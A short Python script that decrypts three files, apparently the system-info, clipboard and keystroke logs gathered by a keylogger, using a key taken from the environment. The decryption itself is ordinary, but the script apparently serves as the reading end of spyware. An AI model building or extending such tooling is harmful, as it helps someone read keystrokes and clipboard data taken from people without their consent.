import os
from cryptography.fernet import Fernet

class KeyManager:
    """Singleton class for managing the encryption key."""
    
    _instance = None

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super(KeyManager, cls).__new__(cls)
            cls._instance.key = os.getenv('ENCRYPTION_KEY')
        return cls._instance

class Decryptor:
    """Responsible for decrypting files."""
    
    def __init__(self, key_manager: KeyManager):
        self.key_manager = key_manager
        self.fernet = Fernet(self.key_manager.key)

    def decrypt_file(self, file_name: str) -> bytes:
        """Decrypt a single file."""
        with open(file_name, 'rb') as f:
            data = f.read()
        return self.fernet.decrypt(data)

class FileHandler:
    """Handles file operations."""
    
    @staticmethod
    def write_decrypted_data(data: bytes, output_file: str):
        """Write decrypted data to the output file."""
        with open(output_file, 'ab') as f:
            f.write(data)

def main():
    # Environment variables
    decrypted_files = [
        os.getenv('SYSTEM_INFO_FILE'),
        os.getenv('CLIPBOARD_INFO_FILE'),
        os.getenv('KEY_LOG_FILE')
    ]
    output_file = os.getenv('DECRYPTION_OUTPUT_FILE', 'decryption.txt')

    # Dependency Injection
    key_manager = KeyManager()
    decryptor = Decryptor(key_manager)
    
    # Decrypt files
    for file_name in decrypted_files:
        decrypted_data = decryptor.decrypt_file(file_name)
        FileHandler.write_decrypted_data(decrypted_data, output_file)

if __name__ == '__main__':
    main()
